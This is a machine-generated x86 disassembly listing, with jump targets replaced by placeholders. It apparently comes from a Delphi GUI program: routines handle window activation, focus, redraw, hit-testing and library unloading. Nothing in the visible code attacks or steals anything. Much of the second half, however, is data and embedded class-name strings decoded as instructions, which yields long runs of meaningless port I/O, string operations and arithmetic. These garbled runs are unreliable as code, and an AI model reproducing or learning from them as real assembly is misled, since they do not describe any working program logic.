sub [ ebp - 0x6d ] eax
sub [ ebp - 0x65 ] eax
mov cl 0x1
mov edx [ ebp - 0x10 ]
mov eax [ ebx ]
call sub_3ad01a0
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_3ad01a0
jmp r-xdata
sub_3ad0a14
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov esi eax
xor ebx ebx
jmp r-xdata
mov eax [ esi + 0xd0 ]
call sub_3a66414
cmp ebx eax
jl r-xdata
lea edi [ ebx + ebx * 2 ]
mov eax [ esi + 0xd0 ]
cmp ebp [ eax + edi * 4 + 0x4 ]
jne r-xdata
mov eax [ esi + 0xcc ]
mov [ esp ] eax
inc [ esi + 0xcc ]
mov eax [ esi + 0xd0 ]
call sub_3a66414
cmp ebx eax
jl r-xdata
mov eax [ esi + 0xd0 ]
cmp [ eax + edi * 4 ] 0xffffffff
je r-xdata
mov eax [ esi + 0xd0 ]
mov eax [ eax + edi * 4 ]
mov [ esp ] eax
jmp r-xdata
lea eax [ ebx + ebx * 2 ]
mov edx [ esi + 0xd0 ]
mov ecx [ esp ]
mov [ edx + eax * 4 ] ecx
mov edx [ esi + 0xd0 ]
mov [ edx + eax * 4 + 0x4 ] ebp
mov edx [ esi + 0xd0 ]
cmp [ ebp + 0x344 ] 0x0
setne cl
mov [ edx + eax * 4 + 0x8 ] cl
mov eax [ esi + 0xd0 ]
call sub_3a66414
mov ebx eax
lea eax [ ebx + 0x1 ]
push eax
lea eax [ esi + 0xd0 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_3a665d0
add esp 0x4
inc ebx
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_3ad0adc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_3a652f4
cmp [ ebx + 0x284 ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x284 ]
call sub_3a652f4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3ad0b18
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
cmp [ ebx + 0xf2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov edx esp
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
cmp [ esp ] 0x0
jne r-xdata
call GetActiveWindow
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call GetLastActivePopup
mov [ esp ] eax
sub_3ad0b60
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
cmp [ ebx + 0xfa ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov edx esp
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
mov eax [ esp ]
pop edx
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax [ ebx + 0x44 ]
call sub_3ab7c38
mov [ esp ] eax
sub_3ad0ba0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_3ab0e78
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_3ab0e78
dec eax
je r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_3ac0dfc
sub_3ad0c38
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xda ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_3ad0c60
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xe2 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_3ad0d04
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
xor ebx ebx
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ edi ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
mov eax ebp
call sub_3aac5e0
mov esi eax
test esi esi
jne r-xdata
cmp ebp [ eax + 0x29c ]
jne r-xdata
test esi esi
je r-xdata
push ebp
call GetParent
mov ebp eax
test ebp ebp
je r-xdata
mov esi eax
jmp r-xdata
mov edx edi
mov eax esi
mov si 0xffb1
call sub_3a6457c
mov ebx eax
mov eax ebp
call sub_3aac5e0
mov esi eax
test esi esi
je r-xdata
sub_3ad0d7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_3a7efcc
mov esi eax
mov eax ebx
call sub_3ad0d70
mov [ eax + 0x18 ] esi
pop esi
pop ebx
retn
sub_3ad0d98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_3a7e46c
push eax
mov eax ebx
call sub_3ad0d70
pop edx
mov [ eax + 0x8 ] dl
pop esi
pop ebx
retn
sub_3ad0db4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_3a7efcc
mov esi eax
mov eax ebx
call sub_3ad0d70
mov [ eax + 0xc ] esi
pop esi
pop ebx
retn
sub_3ad0dd0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_3a7efcc
mov esi eax
mov eax ebx
call sub_3ad0d70
mov [ eax + 0x14 ] esi
pop esi
pop ebx
retn
sub_3ad0dec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_3a7e46c
push eax
mov eax ebx
call sub_3ad0d70
pop edx
mov [ eax + 0x28 ] dl
pop esi
pop ebx
retn
sub_3ad0e08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_3a7efcc
mov esi eax
mov eax ebx
call sub_3ad0d70
mov [ eax + 0x10 ] esi
pop esi
pop ebx
retn
sub_3ad0e24
push ebx
add esp 0xfffffff0
mov ebx eax
call sub_3a91b8c
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
add esp 0x10
pop ebx
retn
push 0xffffffff
push 0x0
mov eax ebx
call sub_3ab7c38
push eax
call InvalidateRect
mov eax ebx
call sub_3ad0d70
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax esp
xor ecx ecx
mov edx 0x10
call sub_3a63a44
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax ebx
call sub_3ab7c38
mov edx esp
call sub_3a91a60
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
push 0xffffffff
push 0x0
mov eax ebx
call sub_3ab7c38
push eax
call InvalidateRect
jmp r-xdata
mov [ esp ] 0xffffffff
mov [ esp + 0x4 ] 0xffffffff
mov [ esp + 0x8 ] 0xffffffff
mov [ esp + 0xc ] 0xffffffff
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ esp ] edx
mov edx [ eax + 0x14 ]
mov [ esp + 0x4 ] edx
mov edx [ eax + 0x10 ]
mov [ esp + 0x8 ] edx
mov eax [ eax + 0x18 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
sub_3ad0f9c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov [ edi + 0x4 ] esi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x10 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
xor eax eax
mov [ edi + 0x18 ] eax
mov [ edi + 0x28 ] 0x0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ad0ff0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_3a7aad0
pop esi
pop ebx
retn
mov eax esi
movzx edx [ eax + 0x8 ]
mov [ ebx + 0x8 ] dl
mov edx [ eax + 0xc ]
mov [ ebx + 0xc ] edx
mov edx [ eax + 0x10 ]
mov [ ebx + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebx + 0x14 ] edx
mov edx [ eax + 0x18 ]
mov [ ebx + 0x18 ] edx
movzx eax [ eax + 0x28 ]
mov [ ebx + 0x28 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_3ad105c
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call sub_3a91b8c
test al al
je r-xdata
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
sub_3ad1094
push ebx
push esi
push edi
add esp 0xffffffc8
mov edi edx
mov esi eax
xor ebx ebx
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax ebx
add esp 0x38
pop edi
pop esi
pop ebx
retn
call sub_3a91b8c
test al al
je r-xdata
movzx ebx [ esi + 0x28 ]
test bl bl
jne r-xdata
mov edx esp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x20 ]
push eax
lea edx [ esp + 0x4 ]
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_3ab2768
mov eax [ esp + 0x20 ]
mov [ esp ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x4 ] eax
lea eax [ esp + 0x20 ]
push eax
lea edx [ esp + 0xc ]
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_3ab2768
mov eax [ esp + 0x20 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0xc ] eax
lea edx [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x1c ]
sub eax [ esi + 0x18 ]
push eax
lea eax [ esp + 0x2c ]
push eax
mov ecx [ esp + 0x20 ]
sub ecx [ esi + 0x14 ]
mov edx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
call sub_3a78e1c
lea esi [ esp + 0x28 ]
lea edi [ esp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov bl 0x1
push [ esp + 0xc ]
push [ esp + 0xc ]
lea eax [ esp + 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor ebx ebx
jmp r-xdata
sub_3ad1184
push ebx
mov ebx eax
cmp dl [ ebx + 0x8 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x8 ] dl
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x350 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebx + 0x4 ]
call sub_3acc098
sub_3ad11b4
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
mov [ esi + 0xc ] ecx
inc ecx
jne r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
mov [ esi + 0x10 ] ecx
inc ecx
jne r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
mov [ esi + 0x14 ] ecx
inc ecx
jne r-xdata
cmp ecx [ esi + 0x18 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
mov [ esi + 0x18 ] ecx
inc ecx
jne r-xdata
pop esi
retn
mov [ esi + 0x28 ] 0x1
sub_3ad1214
cmp dl [ eax + 0x28 ]
je r-xdata
retn
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov [ eax + 0x28 ] dl
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ eax + 0xc ] 0xffffffff
je r-xdata
cmp [ eax + 0x10 ] 0xffffffff
je r-xdata
cmp [ eax + 0x14 ] 0xffffffff
je r-xdata
cmp [ eax + 0x18 ] 0xffffffff
je r-xdata
sub_3ad1248
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
call sub_3ac4004
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov [ rw-data ] 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
mov eax ebx
call sub_3ace05c
mov dl 0x1
mov eax ebx
call sub_3ace1b8
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ ebx + 0x14a ] 0x0
je r-xdata
mov eax esi
call sub_3ab7c38
push eax
call SetFocus
mov edx ebx
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_3ad13b4
in al 0x1a
mov al 0x3
add [ eax ] al
add [ eax ] al
cmp al 0xca
scasd [ edi ]
add edi [ eax + 0x3b016 ]
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_3ad13f4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ad13fb
retn
call sub_3ad1330
sub_3ad1400
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3ad143c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ad1443
retn
mov eax rw-data
mov ecx 0x6
mov edx [ r-xdata ]
call sub_3a65e38
sub_3ad1448
push es
add [ eax ] al
add [ eax - 0x36 ] bh
scasd [ edi ]
add ecx eax
sbb [ eax - 0x50358bfd ] esi
add edx [ eax ]
sbb dh [ eax - 0x50358ffd ]
add edx [ eax ]
pop ss
mov al 0x3
insb
0x3af
sub_3ad1468
fcom [ edi ]
mov al 0x3
push 0x7003afca
sbb [ eax - 0x50359bfd ] esi
add ebp esp
sbb [ eax - 0xfd ] dh
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3ad14d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ad14dc
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_3a652a0
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_3ad14e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3ad1524
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ad152b
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_3ad1563
add ebx [ eax + eax ]
add [ eax ] al
xor al 0x7e
cmpsd [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebp [ eax - 0x52 ]
cmpsd [ esi ] [ edi ]
add esi [ ebx + ebp * 4 - 0x5443fc59 ]
cmpsd [ esi ] [ edi ]
add edi [ eax + 0x26 ]
lodsd [ esi ]
add ecx [ edi - 0x53 ]
add esi [ edi + ebp * 4 - 0x501bfc59 ]
cmpsd [ esi ] [ edi ]
add ebx esp
scasd [ edi ]
cmpsd [ esi ] [ edi ]
add edx [ eax ]
daa
lodsd [ esi ]
add edi [ edi - 0x53 ]
add ebx [ eax - 0x5bfc52d9 ]
daa
lodsd [ esi ]
add ecx [ esi ]
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x1003a6 ] dl
add [ eax ] al
adc [ esp + ecx * 2 + 0x69 ] dl
jae r-xdata
or cl [ ecx + 0x6d ]
inc ebx
outsd
outsb
je r-xdata
pop es
push esp
push ss
lodsd [ esi ]
add eax [ ebx ]
adc dl [ esp + ecx * 2 + 0x69 ]
jae r-xdata
popad
dec ecx
outsb
js r-xdata
outsd
insb
dec ecx
je r-xdata
dec ecx
je r-xdata
inc ebx
outsd
outsb
je r-xdata
dec ecx
je r-xdata
insd
nop
loopne r-xdata
outsb
je r-xdata
insd
outsd
insb
dec ecx
je r-xdata
add [ eax + 0x2803ad17 ] dl
insd
adc eax 0x7ec003ad
adc [ esp + ecx * 2 + 0x69 ] dl
jae r-xdata
lodsd [ esi ]
add eax [ edi ]
add [ eax ] al
add al al
jg r-xdata
nop
pop ss
lodsd [ esi ]
add ebp [ eax ]
outsd
insb
dec ecx
je r-xdata
add ecx [ eax ]
add al 0x4c
outsd
jb r-xdata
jae r-xdata
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
cmpsd [ esi ] [ edi ]
add eax [ edx ]
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
insd
mov [ 0x7ec003ad ] ss
insd
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
add ebx esp
insb
dec ecx
je r-xdata
adc [ esi + 0x1003 ] ah
jmp [ eax ]
add [ eax + edx + 0x1003a6 ] dl
add bh bh
and [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
pop es
inc ebx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
jae r-xdata
add [ eax ] al
inc ebx
outsd
jae r-xdata
push esp
jns r-xdata
add edi [ eax ]
mov ch 0xa7
add edi [ esi * 4 - 0x4abffc59 ]
cmpsd [ esi ] [ edi ]
add esi esp
mov ah 0xa7
add edi eax
mov ah 0xa7
add esp [ ecx + esi * 4 - 0x59 ]
add esp eax
mov cl 0xa7
add ebx [ eax + ebp ]
lodsd [ esi ]
add edx [ ecx ]
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
add edi [ ebx + ebp * 4 - 0x4f33fc59 ]
cmpsd [ esi ] [ edi ]
insb
add [ eax ] al
insb
dec ecx
je r-xdata
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
xor dl [ eax ]
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
insd
or [ 0x6d657449 ] al
nop
mov al [ 0x803ad16 ]
adc [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
sbb [ eax ] al
add bh bh
sub [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add [ eax ] eax
dec esp
xor [ eax ] edx
push esp
add eax 0x6d657449
cmpsb [ esi ] [ edi ]
inc ebx
outsd
outsb
je r-xdata
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x16 ] dl
lodsd [ esi ]
add eax [ esi ]
jae r-xdata
add esi [ ebx + ebp * 4 - 0x5443fc59 ]
mov al 0xa7
insd
pop es
nop
sbb [ ebp + 0x54120803 ] ch
dec ecx
push esp
jns r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
insd
jae r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3ad17 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
outsd
insd
jo r-xdata
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ eax - 0x50 ]
cmpsd [ esi ] [ edi ]
outsd
adc [ esp + ecx * 2 + 0x69 ] dl
jae r-xdata
dec esi
outsd
outsb
push es
jae r-xdata
jb r-xdata
add [ eax - 0x33fc52e7 ] cl
add [ eax ] al
add [ eax + 0x2 ] dl
lodsb [ esi ]
insd
push ebx
insb
add edx [ eax + 0x803ad18 ]
adc dl [ ecx + ecx * 2 + 0x74 ]
insd
pushfd
push ss
add [ eax ] al
shr [ eax + 0x703ad17 ] 0x11
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
add ebx esp
adc eax 0x15dc03ad
lodsd [ esi ]
add ecx [ ebx - 0x52e89b40 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
inc ebx
outsd
outsb
je r-xdata
inc esp
popad
je r-xdata
cmpsd [ esi ] [ edi ]
adc [ esi + 0x17a40003 ] ah
lodsd [ esi ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
lodsd [ esi ]
add esi eax
sub eax 0x541103ad
inc ebx
jne r-xdata
add esi eax
cmp eax 0x45d403a8
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add edx [ ebx + ecx + 0xbe403ac ]
outsb
je r-xdata
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or [ edi + 0x6e ] ecx
inc ebx
outsd
insd
jo r-xdata
insb
dec ecx
je r-xdata
adc eax 0xc08b03ad
inc ebp
jbe r-xdata
cmpsd [ esi ] [ edi ]
add ecx esp
mov al 0xa7
stosd [ edi ]
outsd
push es
jae r-xdata
add [ ebp + 0x19d00040 ] cl
lodsd [ esi ]
add ecx [ eax ]
adc al 0x54
inc edi
je r-xdata
outsd
outsb
je r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
inc ebp
jbe r-xdata
jb r-xdata
lodsd [ esi ]
add esp [ eax ]
add [ eax ] al
jmp [ eax ]
insd
jae r-xdata
pop ss
lodsd [ esi ]
mov eax eax
outsb
je r-xdata
je r-xdata
push esp
js r-xdata
outsb
je r-xdata
imul esi [ edx + 0x74 ] 0x496c6175
je r-xdata
add [ 0x756c6156 ] eax
dec ecx
outsb
je r-xdata
je r-xdata
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
mov eax eax
mov al [ 0x703ad19 ]
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
or [ edi ] al
inc ebx
outsd
outsb
je r-xdata
push esp
inc ebx
jne r-xdata
inc esp
sbb [ ebp + 0x54120803 ] ch
inc edi
je r-xdata
and [ eax ] al
add bh bh
pop ss
lodsd [ esi ]
add edx [ eax - 0x80 ]
cmpsd [ esi ] [ edi ]
add eax [ ebx ]
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
imul esi [ ebx + 0x74 ] 0x694c5411
jae r-xdata
or [ esp + ecx * 2 ] al
dec ecx
outsb
je r-xdata
push es
jae r-xdata
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
jb r-xdata
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
insd
inc ebp
jbe r-xdata
add edx eax
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx + ebx ] al
lodsd [ esi ]
add ebx eax
jb r-xdata
add [ eax ] al
add [ eax ] al
sbb ebp [ ebp + 0x3 ]
outsb
sub [ ecx ] bl
lodsd [ esi ]
add esi [ eax ]
add ebp [ ebx + eax + 0x4c090003 ]
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
xor al 0x2a
lodsd [ esi ]
add esi esp
inc eax
test al 0x3
cwde
inc eax
test al 0x3
in al dx
sub ebp [ ebp - 0x57bfa3fd ]
add ecx [ edx + ebp + 0x5ec03ad ]
lodsb [ esi ]
add esp eax
push cs
lodsb [ esi ]
add edi [ eax + 0xe ]
lodsb [ esi ]
add edx [ eax ]
adc ch [ ebx + eax + sub_3ad2bb4 ]
loopne r-xdata
inc eax
outsd
insb
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
test al 0x3
cwde
add al 0xac
add edi [ eax + 0x803ac10 ]
lodsb [ esi ]
add esp esp
or ebp [ ebx + eax + sub_3a839f4 ]
shr [ edx + 0x2bf003a7 ] 0x1
lodsd [ esi ]
add esi [ eax + eax * 2 ]
je r-xdata
je r-xdata
je r-xdata
cmpsb [ esi ] [ edi ]
add ebx [ eax + eax ]
add bh bh
sbb al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax 0x65736143
push ebx
outsb
jae r-xdata
add [ eax ] al
adc [ esi + 0x1c03 ] ah
[ eax + eax ]
jb r-xdata
inc edx
outsd
je r-xdata
pop eax
sbb ch [ ebp - 0x57c20ffd ]
add edx esp
inc ebp
je r-xdata
inc esp
popad
je r-xdata
add al 0x44
add edx [ eax + edx + 0x103c03a6 ]
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ ebx - 0x52e55b40 ] cl
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx ] ah
outsb
je r-xdata
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
test al 0x3
aam 0x45
outsb
add [ bp + si ] ecx
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
push esi
popad
insb
jne r-xdata
push es
add eax 0x756c6156
test al 0x3
lodsb [ esi ]
add ecx [ eax ]
outsd
insb
add [ ecx + ebx - 0x51d7fc53 ] bl
xchg esp eax
or ebp [ ebx + eax + sub_3ac0be4 ]
hlt
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
jae r-xdata
insd
inc ebx
outsd
jne r-xdata
outsb
je r-xdata
dec ecx
or [ ecx + ebp * 2 + 0x73 ] ecx
je r-xdata
add [ eax ] al
add [ eax ] al
adc [ esi + 0xa003 ] ah
jmp [ esp + ebp ]
add [ eax ] al
insd
push esi
imul esi [ edx + 0x74 ] 0x4c6c6175
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
lea eax [ eax ]
and al 0x1b
lodsd [ esi ]
add eax [ edi ]
sbb [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add edx [ ebx + ecx + 0xbe403ac ]
lodsb [ esi ]
add esi esp
cmp [ eax - 0x58552ffd ] ebp
add esi eax
sub ebp [ ebp - 0x57bfcbfd ]
add ebx [ eax - 0x47fc53fc ]
adc [ ebx + eax + sub_3a83e08 ] ch
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
xor al 0x2a
lodsd [ esi ]
add esi esp
inc eax
test al 0x3
cwde
inc eax
test al 0x3
in al dx
sub ebp [ ebp - 0x57bfa3fd ]
add ecx [ edx + ebp + 0x5ec03ad ]
lodsb [ esi ]
add esp eax
push cs
lodsb [ esi ]
add edi [ eax + 0xe ]
lodsb [ esi ]
add edx [ eax ]
adc ch [ ebx + eax + sub_3ad2bb4 ]
inc esp
lodsd [ cs : esi ]
add esi eax
sub eax 0x541803ad
inc ebx
jne r-xdata
pop es
push eax
outsd
